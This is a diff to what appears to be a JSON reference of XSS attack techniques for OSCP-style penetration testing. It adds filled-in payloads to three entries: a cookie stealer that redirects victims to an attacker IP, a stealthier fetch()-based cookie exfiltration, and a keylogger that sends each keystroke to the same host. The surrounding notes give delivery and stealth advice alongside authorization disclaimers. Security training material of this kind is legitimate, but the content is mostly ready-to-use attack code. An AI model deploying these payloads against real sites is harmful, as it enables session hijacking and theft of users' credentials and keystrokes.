@@ -398,7 +398,8 @@
         "XSS blocked": "First achieve basic XSS (xss-test-img-onerror) before exploitation"
       },
       "notes": "PREREQUISITES:\nStart listener on attacker machine:\npython3 -m http.server <PORT>.\n\nUse when:\nBasic XSS confirmed, targeting session hijacking.\n\nHow it works:\ndocument.cookie retrieves all accessible cookies, document.location redirects victim to attacker URL with cookies in query string.\n\nWorks in:\nAny browser, any XSS context.\n\nDelivery:\nUse proven XSS vector (IMG onerror, SVG onload) but replace alert(1) with this payload.\n\nExpected result:\nAttacker web server receives HTTP request with victim's cookies.\n\nCRITICAL:\nHttpOnly flag (set on sensitive cookies) prevents document.cookie access - check Set-Cookie headers.\n\nAUTHORIZATION:\nOnly use on authorized penetration tests.\n\nLEGAL:\nUnauthorized cookie theft is illegal.\n\nALTERNATIVES:\nUse fetch() API for stealthier exfiltration, or target localStorage for modern apps.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "<script>document.location='http://10.10.14.5:8000/steal.php?c='+document.cookie</script>"
     },
     {
       "id": "xss-session-hijack-fetch",
@@ -455,7 +456,8 @@
         "CORS error": "CORS doesn't prevent simple GET requests - check CSP instead"
       },
       "notes": "PREREQUISITES:\nStart listener:\npython3 -m http.server <PORT> or nc -lvnp <PORT>.\n\nUse when:\nBasic XSS confirmed, prefer stealth over xss-cookie-stealer (which redirects page).\n\nHow it works:\nfetch() API sends async HTTP request to attacker server without redirecting victim's page.\n\nModern alternative to XMLHttpRequest.\n\nWorks in:\nModern browsers (IE11+, all current browsers).\n\nDelivery:\nInject via proven XSS vector.\n\nExpected result:\nAttacker receives HTTP GET request with cookie data in query string, victim page remains unchanged.\n\nADVANTAGES over document.location:\nStealthy (no redirect), can send multiple requests, victim stays on page.\n\nLIMITATIONS:\nHttpOnly cookies still protected.\n\nCSP connect-src directive may block.\n\nAUTHORIZATION:\nOnly use on authorized tests.\n\nLEGAL:\nSession hijacking is illegal without authorization.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "<script>fetch('http://10.10.14.5:8000/steal?c='+document.cookie)</script>"
     },
     {
       "id": "xss-keylogger",
@@ -509,7 +511,8 @@
         "Event overridden": "Use addEventListener instead: document.addEventListener('keypress', ...)"
       },
       "notes": "PREREQUISITES:\nStart listener:\npython3 -m http.server <PORT>.\n\nUse when:\nStored XSS confirmed on high-value target (admin panels, login pages).\n\nHow it works:\nonkeypress event fires on every key, fetch() sends each keystroke to attacker.\n\nReal-time exfiltration.\n\nWorks in:\nAll modern browsers.\n\nDelivery:\nRequires stored/persistent XSS for effectiveness (reflected XSS won't capture much).\n\nExpected result:\nAttacker receives stream of HTTP requests with each key pressed.\n\nSTEALTH ISSUES:\nGenerates high network traffic (one request per keystroke), may be noticeable.\n\nIMPROVEMENT:\nBuffer keystrokes in array, send batch every 5 seconds to reduce traffic.\n\nAUTHORIZATION:\nOnly use on authorized penetration tests.\n\nLEGAL:\nKeylogging is serious crime without authorization.\n\nETHICS:\nEven in authorized tests, discuss scope with client before deploying keyloggers.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "<script>document.onkeypress=function(e){fetch('http://10.10.14.5:8000/log?k='+e.key)}</script>"
     }
   ]
 }
